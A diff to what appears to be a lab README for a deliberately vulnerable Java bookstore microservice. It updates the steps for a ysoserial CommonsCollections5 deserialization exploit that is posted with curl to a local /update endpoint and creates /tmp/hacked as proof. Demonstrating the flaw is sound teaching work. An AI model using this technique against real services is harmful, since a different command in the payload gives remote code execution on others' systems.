@@ -92,16 +92,22 @@ type.
 
 To exploit this, we must first make an exploit that creates a file in `/tmp` as a proof-of-concept:
 ```
-$ git clone ysoserial
-$ docker run ysoserial-bookstore CommonsCollections5 'touch /tmp/hacked' > commonscollections5.ser
+$ git clone https://github.com/frohoff/ysoserial
+$ cd ysoserial
+$ docker build -t ysoserial .
+$ docker run --rm -t ysoserial CommonsCollections5 'touch /tmp/hacked' > commonscollections5.ser
 ```
 
 Now you can send the exploit generated in the `commonscollections5.ser` file:
 ```
-$ curl -vv -X POST -H "Content-Type: application/octet-stream" --data-binary @commonscollections5.ser http://localhost:8001/update
+$ curl -X POST -H "Content-Type: application/octet-stream" --data-binary @commonscollections5.ser http://localhost:8001/update
 ```
 
-To prove that we created this `/tmp/hacked` file, we must shell into the running container. Let's get the ID:
+To prove that we created this `/tmp/hacked` file, we must shell into the running container. 
+
+If you started with docker-compose, the container ID is something like java-microservice-sample-apps_bookstore-datamanager_1.
+
+If you ran the containers manually, you can start with the ID:
 ```
 $ docker ps
 CONTAINER ID        IMAGE                    COMMAND                 CREATED              STATUS              PORTS                              NAMES
@@ -110,8 +116,7 @@ CONTAINER ID        IMAGE                    COMMAND                 CREATED    
 
 Now, using that container ID, we shell into the container and confirm the exploit created the `/tmp/hacked` file:
 ```
-$ docker exec -it 3729e1f30284 bash
-\# ls -al /tmp
+$ docker exec -it java-microservice-sample-apps_bookstore-datamanager_1 ls -al /tmp
 ...
 */tmp/hacked*
 ```
